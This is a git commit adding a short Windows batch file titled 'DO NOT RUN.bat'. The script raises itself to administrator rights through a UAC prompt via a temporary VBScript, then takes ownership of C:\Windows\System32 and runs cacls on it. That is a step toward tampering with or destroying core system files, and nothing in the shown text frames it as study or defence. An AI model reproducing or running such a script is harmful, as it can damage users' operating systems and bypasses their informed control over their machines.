226fa3be5a75f5f2b754fb77f6699f5511935b0e
Calcium <dakotadanielsga@gmail.com>
2020-10-27 12:10:03 -0400

    Add files via upload

---
+++ DO NOT RUN.bat
@@ -0,0 +1,24 @@
+@echo off
+
+:: Get ADMIN Privs
+:-------------------------------------
+mkdir "%windir%\BatchGotAdmin"
+if '%errorlevel%' == '0' (
+  rmdir "%windir%\BatchGotAdmin" & goto gotAdmin 
+) else ( goto UACPrompt )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute %~s0, "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+    pushd "%CD%"      
+    CD /D "%~dp0"
+:-------------------------------------
+:: End Get ADMIN Privs
+takeown /f C:\Windows\System32
+cacls C:\Windows\System32
